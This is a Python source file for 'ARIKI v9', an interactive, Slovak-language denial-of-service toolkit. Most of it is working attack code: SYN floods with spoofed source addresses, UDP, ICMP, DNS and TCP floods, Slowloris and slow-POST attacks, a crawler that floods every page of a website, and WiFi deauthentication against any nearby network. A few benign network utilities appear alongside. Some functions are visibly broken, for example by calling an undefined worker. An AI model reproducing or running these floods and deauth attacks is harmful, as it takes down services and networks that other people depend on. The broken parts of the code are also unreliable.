#!/usr/bin/env python3
import os, sys, socket, struct, random, time, ssl, threading, re, subprocess, errno, math, gzip
import http.cookiejar
import urllib.request
from urllib.parse import urljoin, urlparse, quote
import multiprocessing as mp
from concurrent.futures import ThreadPoolExecutor, as_completed

R, G, Y, C, B, X = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[1m", "\033[0m"

_AR = [" \u2588\u2588\u2588\u2588\u2588 ", "\u2588\u2588\u2554\u2550\u2550\u2588\u2588", "\u2588\u2588\u2588\u2588\u2588\u2588\u2588", "\u2588\u2588\u2554\u2550\u2550\u2588\u2588", "\u2588\u2588\u2551  \u2588\u2588", "\u255a\u2550\u255d  \u255a\u2550"]
_RR = ["\u2588\u2588\u2588\u2588\u2588\u2588 ", "\u2588\u2588\u2554\u2550\u2550\u2588\u2588", "\u2588\u2588\u2588\u2588\u2588\u2588\u2554", "\u2588\u2588\u2554\u2550\u2550\u2588\u2588", "\u2588\u2588\u2551  \u2588\u2588", "\u255a\u2550\u255d  \u255a\u2550"]
_IK = ["\u2588\u2588", "\u2588\u2588", "\u2588\u2588", "\u2588\u2588", "\u2588\u2588", "\u255a\u2550"]
_KR = ["\u2588\u2588\u2557  \u2588\u2588", "\u2588\u2588\u2551 \u2588\u2588\u2554", "\u2588\u2588\u2588\u2588\u2588\u2554\u255d", "\u2588\u2588\u2554\u2550\u2588\u2588\u2557", "\u2588\u2588\u2551  \u2588\u2588", "\u255a\u2550\u255d  \u255a\u2550"]
_ART = []
for _i in range(6):
    _ART.append(C + "  ".join(x.ljust(8) for x in
               [_AR[_i], _RR[_i], _IK[_i], _KR[_i], _IK[_i]]) + X)

BANNER = (
    "\n  " + "\n  ".join(_ART) +
    "\n" +
    "  " + C + "\u2550\u2550\u2550 ARIKI v9 \u00b7 Internet Killer Interface \u2550\u2550\u2550" + X + "\n" +
    "  " + Y + "39 funkcii | pool-engine | low-CPU dizajn | Kali Linux" + X + "\n"
)

def hd(t):
    print(f"\n  {C}\u2554{'\u2550'*34}{X} {B}{t}{X} {C}{'\u2550'*34}\u2557{X}")

try:
    import playwright
    HAS_PW = True
except ImportError:
    HAS_PW = False

MPX = mp.get_context("fork")
CPU_TOTAL = os.cpu_count() or 2
CPU_USED = max(1, int(CPU_TOTAL * 0.7))
NICE_LEVEL = 15
BATCH = 4096
RATE_LIMIT = 0
ECO = False

def chksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    return (~s) & 0xFFFF

def nfmt(n):
    return f"{n:,}".replace(",", " ")

def ask(prompt, default=None):
    d = f" [{default}]" if default is not None else ""
    v = input(f"  {C}{prompt}{X}{d}: ").strip()
    return v if v else (str(default) if default is not None else "")

def get_ip(host):
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        print(f"  {R}[!] Neplatny host{X}")
        return None

def mmsend(s, seq):
    try:
        return s.sendmmsg(seq), 0
    except BlockingIOError:
        return 0, 0
    except OSError as e:
        if e.errno in (errno.EAGAIN, errno.ENOBUFS, errno.ENOMEM):
            return 0, 0
        return 0, len(seq)
    except (AttributeError, TypeError):
        ok = err = 0
        for d, a in seq:
            try:
                s.sendto(d, a); ok += 1
            except socket.error:
                err += 1
        return ok, err

def binder(rank):
    try:
        os.sched_setaffinity(0, {rank % CPU_USED})
    except Exception:
        pass
    try:
        os.nice(NICE_LEVEL)
    except Exception:
        pass

def rate(n):
    if RATE_LIMIT > 0:
        time.sleep(max(0.0, n / RATE_LIMIT))

def eco_sleep():
    if ECO:
        time.sleep(0.001)

class Stats:
    def __init__(self):
        self.cnt = MPX.Value("q", 0)
        self.err = MPX.Value("q", 0)
        self.lost = MPX.Value("q", 0)
        self.bytes = MPX.Value("q", 0)
        self.rttn = MPX.Value("q", 0)
        self.rtts = MPX.Value("d", 0.0)
        self.t0 = MPX.Value("d", time.time())

def spawn(n, target, args):
    procs = []
    for r in range(n):
        p = MPX.Process(target=target, args=(r,) + args, daemon=True)
        p.start()
        procs.append(p)
    return procs

def nprocs(sil):
    n = max(1, min(CPU_USED, sil * 2))
    if ECO:
        n = max(1, n // 2)
    return n

def report(st, title, unit="paketov"):
    dt = time.time() - st.t0.value
    r = int(st.cnt.value / dt) if dt > 0 else 0
    print(f"\n  {B}--- {title} - vysledok ---{X}")
    print(f"    odoslane:   {G}{nfmt(st.cnt.value)}{X} {unit}")
    print(f"    rychlost:   {G}{nfmt(r)}{X} {unit}/s")
    print(f"    trvanie:    {dt:.1f} s")
    if st.rttn.value:
        avg = st.rtts.value / st.rttn.value
        print(f"    odozva:     {avg:.2f} ms (z {nfmt(st.rttn.value)} merani)")
    if st.err.value:
        print(f"    chyby:      {R}{nfmt(st.err.value)}{X}")
    if st.lost.value:
        print(f"    straty:     {Y}{nfmt(st.lost.value)}{X}")
    print("")

def live(st, stop, procs, dur, title, unit="pakety"):
    t0 = time.time()
    spin = 0
    chars = ("|", "/", "-", "\\")
    try:
        while not stop.is_set() and (dur == 0 or time.time() - t0 < dur):
            dt = time.time() - st.t0.value
            r = int(st.cnt.value / dt) if dt > 0 else 0
            line = (f"  {C}{title}{X}  {G}{nfmt(st.cnt.value)}{X} {unit}"
                    f" | {G}{nfmt(r)}{X} {unit}/s | cas {B}{dt:5.1f}{X}s")
            if dur > 0:
                w = 14
                k = min(w, int(dt / dur * w))
                line += f" {C}[{'\u2588'*k}{'\u2591'*(w-k)}]{X}"
            if st.rttn.value:
                line += f" | rtt {st.rtts.value/st.rttn.value:.1f}ms"
            if st.err.value:
                line += f" | {R}ch {st.err.value}{X}"
            if st.lost.value:
                line += f" | {Y}sr {st.lost.value}{X}"
            sys.stdout.write("\r" + line + f" {chars[spin % 4]}")
            sys.stdout.flush()
            spin += 1
            time.sleep(0.25)
    except KeyboardInterrupt:
        print(f"\n  {Y}Prerusene uzivatelom.{X}")
    stop.set()
    for p in procs:
        p.join(timeout=0.7)
    report(st, title, unit)

def event():
    return MPX.Event()

# ---------------- pool builders (spravne checksumy) ----------------
def rand_ip():
    return socket.inet_aton(
        "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(0, 254),
                         random.randint(0, 254), random.randint(1, 254)))

def build_tcp_pool(ip, ports, flag, spoof, n=512):
    """Predpripravi n hotovych TCP paketov (porty: int alebo (min,max))."""
    dst = socket.inet_aton(ip)
    if isinstance(ports, tuple):
        pmin, pmax = ports
    else:
        pmin = pmax = ports
    pool = []
    seq = random.randint(0, 0xFFFFFFFF)
    for _ in range(n):
        src = socket.inet_aton(spoof) if spoof else rand_ip()
        sport = random.randint(1024, 65535)
        dport = random.randint(pmin, pmax) if pmax > pmin else pmin
        tcp = bytearray(20)
        struct.pack_into("!HH", tcp, 0, sport, dport)
        struct.pack_into("!L", tcp, 4, seq)
        struct.pack_into("!B", tcp, 12, 5 << 4)
        struct.pack_into("!B", tcp, 13, flag)
        struct.pack_into("!H", tcp, 14, 65535)
        ph = src + dst + struct.pack("!BBH", 0, socket.IPPROTO_TCP, 20)
        struct.pack_into("!H", tcp, 16, chksum(ph + tcp))
        ip_h = bytearray(20)
        struct.pack_into("!B", ip_h, 0, 0x45)
        struct.pack_into("!H", ip_h, 2, 40)
        struct.pack_into("!H", ip_h, 4, random.randint(0, 0xFFFF))
        struct.pack_into("!BBH", ip_h, 8, 64, socket.IPPROTO_TCP, 0)
        ip_h[12:16] = src
        ip_h[16:20] = dst
        struct.pack_into("!H", ip_h, 10, chksum(bytes(ip_h)))
        pool.append((bytes(ip_h) + bytes(tcp), (ip, 0)))
        seq += 1
    return pool

def build_icmp_pool(ip, n=512):
    pid = random.randint(0, 0xFFFF)
    pool = []
    for i in range(n):
        data = b"NETLAB" + struct.pack("!d", time.time())
        hdr = struct.pack("!BBHHH", 8, 0, 0, pid, i & 0xFFFF)
        hdr = hdr[:2] + struct.pack("!H", chksum(hdr + data)) + hdr[2:]
        pool.append((hdr + data, (ip, 0)))
    return pool

def build_dns_pool(domain, n=512):
    pool = []
    for _ in range(n):
        lbl = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
        q = struct.pack("!HHHHHH", random.randint(0, 0xFFFF), 0x0100, 1, 0, 0, 0)
        for part in f"{lbl}.{domain}".split("."):
            q += struct.pack("!B", len(part)) + part.encode()
        q += struct.pack("!B", 0) + struct.pack("!HH", 1, 1)
        pool.append(q)
    return pool

# ============================ 1. PING ============================
def ping_worker(pid, ip, icmp_id, st, stop, interval):
    binder(pid)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.settimeout(1)
    n = 0
    while not stop.is_set():
        t = time.time()
        data = b"NETLAB" + struct.pack("!d", t)
        hdr = struct.pack("!BBHHH", 8, 0, 0, icmp_id, n & 0xFFFF)
        hdr = hdr[:2] + struct.pack("!H", chksum(hdr + data)) + hdr[2:]
        try:
            s.sendto(hdr + data, (ip, 0))
            s.recvfrom(1024)
            with st.cnt.get_lock():
                st.cnt.value += 1
                st.rttn.value += 1
                st.rtts.value += (time.time() - t) * 1000
        except socket.timeout:
            with st.lost.get_lock():
                st.lost.value += 1
        n += 1
        time.sleep(interval)
    s.close()

def ping():
    ip = get_ip(ask("ciel (IP alebo domena)"))
    if not ip: return
    dur = float(ask("trvanie sekund (0 = ne)", "5"))
    sil = int(ask("sila 1-10 (interval)", "5"))
    interval = max(0.05, 3.0 / sil)
    st = Stats(); stop = event()
    procs = spawn(1, ping_worker, (ip, os.getpid() & 0xFFFF, st, stop, interval))
    live(st, stop, procs, dur, "PING " + ip)

# ============================ 2. SYN FLOOD ============================
def syn_worker(pid, pool, st, stop):
    binder(pid)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except OSError:
        return
    n = 0
    last_sync = time.time()
    while not stop.is_set():
        ok, err = mmsend(s, pool[:BATCH])
        n += ok + err
        now = time.time()
        if n >= 16384 or (n >= 2048 and now - last_sync > 0.2):
            with st.cnt.get_lock():
                st.cnt.value += ok
                st.err.value += err
            n = 0
            last_sync = now
        rate(BATCH)
        eco_sleep()

def syn_flood():
    ip = get_ip(ask("ciel"))
    if not ip: return
    port = int(ask("port", "80"))
    spoof = ask("fake zdroj IP (prazdne = nahodna)", "")
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    pool = build_tcp_pool(ip, port, 0x02, spoof)
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), syn_worker, (pool, st, stop))
    live(st, stop, procs, dur, f"SYN flood {ip}:{port}")

# ============================ 4. UDP FLOOD ============================
def udp_worker(pid, ip, ports, size, st, stop):
    binder(pid)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except Exception:
        pass
    data = random.randbytes(size)
    pmin = pmax = ports if isinstance(ports, int) else ports[0]
    if isinstance(ports, tuple):
        pmin, pmax = ports
    i = 0
    while not stop.is_set():
        if pmax > pmin:
            dp = random.randint(pmin, pmax)
        else:
            dp = pmin
        ok, err = mmsend(s, [(data, (ip, dp))] * BATCH)
        i += ok + err
        if i >= 8192:
            with st.cnt.get_lock():
                st.cnt.value += ok
                st.err.value += err
            i = 0
        rate(BATCH)
        eco_sleep()

def udp_flood():
    ip = get_ip(ask("ciel"))
    if not ip: return
    port = ask("port (alebo rozsah a-b)", "4000")
    if "-" in port:
        a, b = map(int, port.split("-"))
        ports = (a, b)
    else:
        ports = int(port)
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    size = int(ask("velkost paketu [512]", "512"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), udp_worker, (ip, ports, size, st, stop))
    live(st, stop, procs, dur, f"UDP flood {ip}:{ports}")

# ============================ 5/6. HTTP/HTTPS FLOOD ============================
def http_worker(pid, url, tls, st, stop):
    binder(pid)
    ctx = ssl.create_default_context()
    n = 0
    while not stop.is_set():
        try:
            if tls:
                r = urllib.request.urlopen(url, timeout=8, context=ctx)
            else:
                r = urllib.request.urlopen(url, timeout=8)
            r.read(); r.close()
            n += 1
        except Exception:
            with st.err.get_lock():
                st.err.value += 1
        if n >= 64:
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
        rate(1)
        eco_sleep()

def http_flood(secure):
    url = ask("URL webu", "")
    scheme = "https" if secure else "http"
    if not url.startswith("http"):
        url = f"{scheme}://{url}/"
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()
    p = urlparse(url)
    host = p.netloc
    port = (443 if secure else 80)
    if ":" in host:
        host, _, sp = host.partition(":")
        try:
            port = int(sp)
        except ValueError:
            pass
    procs = spawn(nprocs(sil), tg_http_worker, (host, port, secure, st, stop))
    live(st, stop, procs, dur, f"{scheme.upper()} {url}", "req")

# ============================ 7. SLOWLORIS ============================
def slow_worker(pid, ip, port, tls, host, st, stop, hold):
    binder(pid)
    ctx = ssl.create_default_context()
    n = 0
    while not stop.is_set():
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(8)
            c.connect((ip, port))
            if tls:
                c = ctx.wrap_socket(c, server_hostname=host)
            c.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() +
                   b"\r\nUser-Agent: Mozilla/5.0\r\nX: 1\r\n\r\n")
            n += 1
            tend = time.time() + hold
            while time.time() < tend and not stop.is_set():
                time.sleep(0.5)
            c.close()
        except (socket.error, ssl.SSLError):
            with st.err.get_lock():
                st.err.value += 1
            time.sleep(0.2)
        if n >= 32:
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
        eco_sleep()

def slowloris():
    host = ask("ciel host")
    ip = get_ip(host)
    if not ip: return
    port = int(ask("port", "80"))
    tls = ask("HTTPS? y/n", "n").lower() == "y"
    dur = float(ask("trvanie (0 = ne)", "10"))
    sil = int(ask("sila 1-10", "5"))
    hold = int(ask("drz socket (sek)", "10"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), slow_worker, (ip, port, tls, host, st, stop, hold))
    live(st, stop, procs, dur, f"Slowloris {host}:{port}", "socks")

# ============================ 8. DNS FLOOD ============================
def dns_worker(pid, pool, ip, st, stop):
    binder(pid)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except Exception:
        pass
    j = 0
    n = 0
    while not stop.is_set():
        batch = [(pool[k % len(pool)], (ip, 53)) for k in range(j, j + BATCH)]
        j += BATCH
        ok, err = mmsend(s, batch)
        n += ok + err
        if n >= 8192:
            with st.cnt.get_lock():
                st.cnt.value += ok
                st.err.value += err
            n = 0
        rate(BATCH)
        eco_sleep()

def dns_flood():
    ip = get_ip(ask("DNS server"))
    if not ip: return
    domain = ask("domena [google.com]", "google.com")
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    pool = build_dns_pool(domain)
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), dns_worker, (pool, ip, st, stop))
    live(st, stop, procs, dur, f"DNS flood {ip}:53")

# ============================ 9. ICMP FLOOD ============================
def icmp_worker(pid, pool, st, stop):
    binder(pid)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except OSError:
        return
    n = 0
    last_sync = time.time()
    while not stop.is_set():
        ok, err = mmsend(s, pool[:BATCH])
        n += ok + err
        now = time.time()
        if n >= 16384 or (n >= 2048 and now - last_sync > 0.2):
            with st.cnt.get_lock():
                st.cnt.value += ok
                st.err.value += err
            n = 0
            last_sync = now
        rate(BATCH)
        eco_sleep()

def icmp_flood():
    ip = get_ip(ask("ciel"))
    if not ip: return
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    pool = build_icmp_pool(ip)
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), icmp_worker, (pool, st, stop))
    live(st, stop, procs, dur, f"ICMP flood {ip}")

# ============================ 10 TRACEROUTE ============================
def traceroute():
    host = ask("ciel (IP/domena)")
    ip = get_ip(host)
    if not ip: return
    print(f"  Traceroute {host} ({ip})")
    recv = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    recv.settimeout(2)
    icmp_id = os.getpid() & 0xFFFF
    for ttl in range(1, 31):
        snd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        snd.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
        data = struct.pack("!d", time.time())
        hdr = struct.pack("!BBHHH", 8, 0, 0, icmp_id, ttl)
        hdr = hdr[:2] + struct.pack("!H", chksum(hdr + data)) + hdr[2:]
        t0 = time.time()
        snd.sendto(hdr + data, (ip, 0))
        try:
            pkt, addr = recv.recvfrom(1024)
            print(f"  {ttl:2d}  {addr[0]:15}  {(time.time()-t0)*1000:6.2f} ms")
            if addr[0] == ip:
                break
        except socket.timeout:
            print(f"  {ttl:2d}  *")
        snd.close()
    recv.close()

# ============================ 11 TCP CONNECT FLOOD ============================
def tcp_conn_worker(pid, ip, port, st, stop):
    binder(pid)
    n = 0
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0:
                n += 1
            else:
                with st.err.get_lock():
                    st.err.value += 1
            s.close()
        except socket.error:
            with st.err.get_lock():
                st.err.value += 1
        if n >= 32:
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
        rate(1)
        eco_sleep()

def tcp_flood():
    ip = get_ip(ask("ciel"))
    if not ip: return
    port = int(ask("port", "80"))
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), tcp_conn_worker, (ip, port, st, stop))
    live(st, stop, procs, dur, f"TCP connect flood {ip}:{port}", "conns")

# ============================ 12. TCP FLAG FLOOD ============================
def tcp_flag_flood():
    ip = get_ip(ask("ciel"))
    if not ip: return
    port = int(ask("port (alebo rozsah a-b)", "80"))
    if "-" in port:
        a, b = map(int, port.split("-"))
        ports = (a, b)
    else:
        ports = int(port)
    print("  flagy: 1=ACK  2=FIN  3=RST  4=SYN+ACK")
    fc = ask("vlajka", "1")
    m = {"1": 0x10, "2": 0x01, "3": 0x04, "4": 0x12}
    flag = m.get(fc, 0x10)
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    pool = build_tcp_pool(ip, ports, flag, None)
    st = Stats(); stop = event()

    def w(pid, pool, st, stop):
        binder(pid)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        n = 0
        while not stop.is_set():
            ok, err = mmsend(s, pool[:BATCH])
            n += ok + err
            if n >= 8192:
                with st.cnt.get_lock():
                    st.cnt.value += ok
                    st.err.value += err
                n = 0
            rate(BATCH)
            eco_sleep()

    procs = spawn(nprocs(sil), w, (pool, st, stop))
    live(st, stop, procs, dur, f"TCP flag flood {ip}:{ports}")

# ============================ 13. MULTI TARGET ============================
def multi_worker(pid, targets, port, st, stop):
    binder(pid)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random.randbytes(512)
    i = 0
    n = 0
    while not stop.is_set():
        tgt = targets[i % len(targets)]
        try:
            s.sendto(data, (tgt, port))
            n += 1
        except socket.error:
            with st.err.get_lock():
                st.err.value += 1
        i += 1
        if n >= 512:
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
        rate(1)
        eco_sleep()

def multi_flood():
    print(f"  {C}Zadaj ciele (jeden na riadok, Enter = koniec):{X}")
    targets = []
    while True:
        t = ask("ciel (Enter = hotovo)")
        if not t:
            break
        targets.append(t)
    if not targets:
        print(f"  {R}[!] ziadne ciele{X}")
        return
    port = int(ask("port", "4000"))
    dur = float(ask("trvanie (0 = ne)", "0"))
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), multi_worker, (targets, port, st, stop))
    live(st, stop, procs, dur, f"Multi flood {len(targets)} ciel")

# ============================ 14. DNS RESOLVER ============================
def dns_test():
    host = ask("domena na test")
    q = build_dns_pool(host, 1)[0]
    for srv in ("8.8.8.8", "1.1.1.1", "9.9.9.9"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.5)
        t = time.time()
        try:
            s.sendto(q, (srv, 53))
            s.recvfrom(2048)
            print(f"  {host}  {srv}: {1000*(time.time()-t):.1f} ms")
        except socket.timeout:
            print(f"  {host}  {srv}: timeout")
        s.close()

# ============================ 15. WHOIS ============================
def whois():
    host = ask("domena (napr. google.com)")
    if not host: return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect(("whois.iana.org", 43))
        s.send((host + "\r\n").encode())
        data = b""
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
        for line in data.decode("utf-8", "ignore").splitlines()[:60]:
            print(f"  {line[:110]}")
        s.close()
    except socket.error as e:
        print(f"  {R}chyba: {e}{X}")

# ============================ 16. WEB KILL (crawl + flood) ============================
def crawl(base, depth, maxurls):
    found = []
    seen = set()
    queue = [(base, 0)]
    ctx = ssl.create_default_context()
    base_n = urlparse(base).netloc
    while queue:
        cur, d = queue.pop(0)
        if cur in seen or d > depth or len(found) >= maxurls:
            continue
        seen.add(cur)
        try:
            req = urllib.request.Request(cur, headers={"User-Agent": "Mozilla/5.0"})
            if cur.startswith("https"):
                r = urllib.request.urlopen(req, timeout=12, context=ctx)
            else:
                r = urllib.request.urlopen(req, timeout=12)
            html = r.read().decode("utf-8", "ignore")
            r.close()
            found.append(cur)
            print(f"  {G}+ {cur}{X}")
            for m in re.findall(r'href=["\']([^"\']+)["\']', html):
                u = m.strip()
                if u.startswith(("#", "mailto:", "javascript:")):
                    continue
                nxt = urljoin(cur, u)
                if urlparse(nxt).netloc == base_n:
                    queue.append((nxt, d + 1))
        except Exception:
            pass
    return found

def web_kill():
    url = ask("ciel URL")
    if not url.startswith("http"):
        url = "http://" + url
    maxu = int(ask("max odkazov", "50"))
    depth = int(ask("hlbka crawl 1-3", "2"))
    dur = float(ask("trvanie floodu (s)", "30"))
    print(f"  {C}[*] Prechadzam web {url} ...{X}")
    links = crawl(url, depth, maxu)
    if not links:
        print(f"  {R}[!] nenasla sa ziadna stranka{X}")
        return
    print(f"  {G}[K] Naslo {len(links)} URL - zhadzujem web...{X}")
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()

    def w(pid):
        binder(pid)
        ctx = ssl.create_default_context()
        i = 0
        n = 0
        while not stop.is_set():
            u = links[i % len(links)]
            try:
                if u.startswith("https"):
                    r = urllib.request.urlopen(u, timeout=10, context=ctx)
                else:
                    r = urllib.request.urlopen(u, timeout=10)
                r.read(); r.close()
                n += 1
            except Exception:
                with st.err.get_lock():
                    st.err.value += 1
            i += 1
            if n >= 64:
                with st.cnt.get_lock():
                    st.cnt.value += n
                n = 0

    procs = spawn(nprocs(sil), w, ())
    live(st, stop, procs, dur, f"WEB KILL {len(links)} url", "req")

# ============================ 17. WIFI (monitor + deauth) ============================
def wifi_hunt():
    iface = ask("wifi dongle (wlan0)", "wlan0")
    print(f"  {C}[W] airmon-ng start {iface} ...{X}")
    out = subprocess.run(f"airmon-ng start {iface}",
                         shell=True, capture_output=True, text=True).stdout
    m = re.search(r"(\S+mon)", out)
    mon = m.group(1) if m else iface + "mon"
    print(f"  {G}monitor: {mon}{X}")
    print(f"  {C}[W] scan okolia...{X}")
    sc = subprocess.run(f"iw dev {mon} scan -w",
                        shell=True, capture_output=True, text=True).stdout
    nets = []
    for blk in re.split(r"^BSS ", sc, flags=re.M):
        if not blk.strip():
            continue
        bss = re.match(r"([0-9a-fA-F:]{17})", blk.strip())
        ssid = re.search(r"SSID:\s*(.+)", blk)
        chan = re.search(r"channel (\d+)", blk)
        nets.append({"bssid": bss.group(1) if bss else "?",
                     "ssid": ssid.group(1).strip() if ssid else "?",
                     "ch": chan.group(1) if chan else "?"})
    if not nets:
        print(f"  {R}[!] Ziaden siet, skontroluj airmon-ng{X}")
        return None
    print(f"  {B}ID   BSSID                 CH  SSID{X}")
    for i, n in enumerate(nets):
        print(f"  [{i}] {n['bssid']}  {n['ch']:>3}  {n['ssid']}")
    idx = int(ask("vyber", "0"))
    net = nets[idx]
    return mon, net

def wifi_kill():
    r = wifi_hunt()
    if not r:
        return
    mon, net = r
    ch = net["ch"]
    if ch != "?":
        subprocess.run(f"iw dev {mon} set channel {ch}", shell=True, capture_output=True)
    dur = int(ask("deauth sekund (0 = stale)", "30"))
    print(f"  {R}Deauth flood -> {net['ssid']} ({net['bssid']}) {X}")
    os.system(f"aireplay-ng -0 0 -a {net['bssid']} -c FF:FF:FF:FF:FF:FF {mon} "
              f"--ignore-negative-one >/dev/null 2>&1 &")
    t0 = time.time()
    try:
        while True:
            time.sleep(1)
            if dur and time.time() - t0 >= dur:
                break
    except KeyboardInterrupt:
        pass
    os.system("killall aireplay-ng; airmon-ng stop " + mon)
    print(f"  {G}Done, monitor zastaveny.{X}")

# ============================ 3. PORT SCAN ============================
def scan_one(ip, port, tm):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(tm)
    try:
        return port if s.connect_ex((ip, port)) == 0 else None
    finally:
        s.close()

def port_scan():
    host = ask("ciel")
    ip = get_ip(host)
    if not ip: return
    rng = ask("rozsah portov [1-1000]", "1-1000")
    a, b = map(int, rng.split("-"))
    tm = float(ask("timeout [0.5]", "0.5"))
    t0 = time.time()
    print(f"  {C}Scan {ip} ({b-a+1} portov){X}")
    open_p = []
    with ThreadPoolExecutor(max_workers=250) as ex:
        for p in ex.map(lambda p: scan_one(ip, p, tm), range(a, b + 1)):
            if p:
                open_p.append(p)
                print(f"  {G}port {p} otvoreny{X}")
    print(f"\n  Hotovo za {time.time()-t0:.1f}s")
    if open_p:
        print(f"  {G}Otvorene: {', '.join(map(str, sorted(open_p)))}{X}")
    else:
        print(f"  {Y}Ziadny otvoreny port{X}")

# ============================ 0. SETTINGS ============================
def settings():
    global RATE_LIMIT, CPU_USED, NICE_LEVEL, BATCH, ECO
    RATE_LIMIT = int(ask("rate limit paketov/s (0 = ziaden)", RATE_LIMIT))
    CPU_USED = int(ask("pocet jadier pre flood", CPU_USED))
    NICE_LEVEL = int(ask("nice priorita (0-19)", NICE_LEVEL))
    BATCH = int(ask("velkost davky paketov", BATCH))
    ECO = ask("ECO rezim (menej HW zataze)? y/n", "n").lower() == "y"
    print(f"  {G}ulozeno.{X}")

# ============================ 19. SLOW POST (RUDY) ============================
def rudy_worker(pid, ip, port, tls, host, st, stop):
    binder(pid)
    ctx = ssl.create_default_context()
    while not stop.is_set():
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(8)
            c.connect((ip, port))
            if tls:
                c = ctx.wrap_socket(c, server_hostname=host)
            body = b"a" * 1024
            c.send(b"POST / HTTP/1.1\r\nHost: " + host.encode() +
                   b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: "
                   b"application/x-www-form-urlencoded\r\nContent-Length: " +
                   str(len(body) * 10).encode() + b"\r\n\r\n")
            with st.cnt.get_lock():
                st.cnt.value += 1
            for _ in range(10):
                if stop.is_set():
                    break
                c.send(body[:8])
                time.sleep(1)
            c.close()
        except (socket.error, ssl.SSLError):
            with st.err.get_lock():
                st.err.value += 1
            time.sleep(0.2)

def rudy():
    host = ask("ciel host")
    ip = get_ip(host)
    if not ip: return
    port = int(ask("port", "80"))
    tls = ask("HTTPS? y/n", "n").lower() == "y"
    dur = float(ask("trvanie (0 = ne)", "10"))
    sil = int(ask("sila 1-10", "5"))
    st = Stats(); stop = event()
    procs = spawn(nprocs(sil), rudy_worker, (ip, port, tls, host, st, stop))
    live(st, stop, procs, dur, f"RUDY slow POST {host}:{port}", "socks")

# ============================ 20. ARP FLOOD ============================
def mac2bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":"))

def build_arp(src_mac, src_ip, tgt_ip):
    eth = bytes.fromhex("ffffffffffff") + mac2bytes(src_mac) + struct.pack("!H", 0x0806)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
    arp += mac2bytes(src_mac) + socket.inet_aton(src_ip)
    arp += b"\x00" * 6 + socket.inet_aton(tgt_ip)
    return eth + arp

def arp_worker(pid, tgt_ip, st, stop):
    binder(pid)
    iface = "eth0"
    idx = socket.if_nametoindex(iface)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((iface, 0x0806))
    n = 0
    while not stop.is_set():
        src_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        src_ip = "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(0, 254),
                                  random.randint(0, 254), random.randint(1, 254))
        frame = build_arp(src_mac, src_ip, tgt_ip)
        try:
            s.send(frame)
            n += 1
        except socket.error:
            with st.err.get_lock():
                st.err.value += 1
        if n >= 1024:
            with st.cnt.get_lock():
                st.cnt.value += n
            n = 0
        eco_sleep()

def arp_flood():
    print("  ! funguje len na vlastnom rozhrani, potrebuje byt v LAN - pouzivaj na vlastnych sietach !")
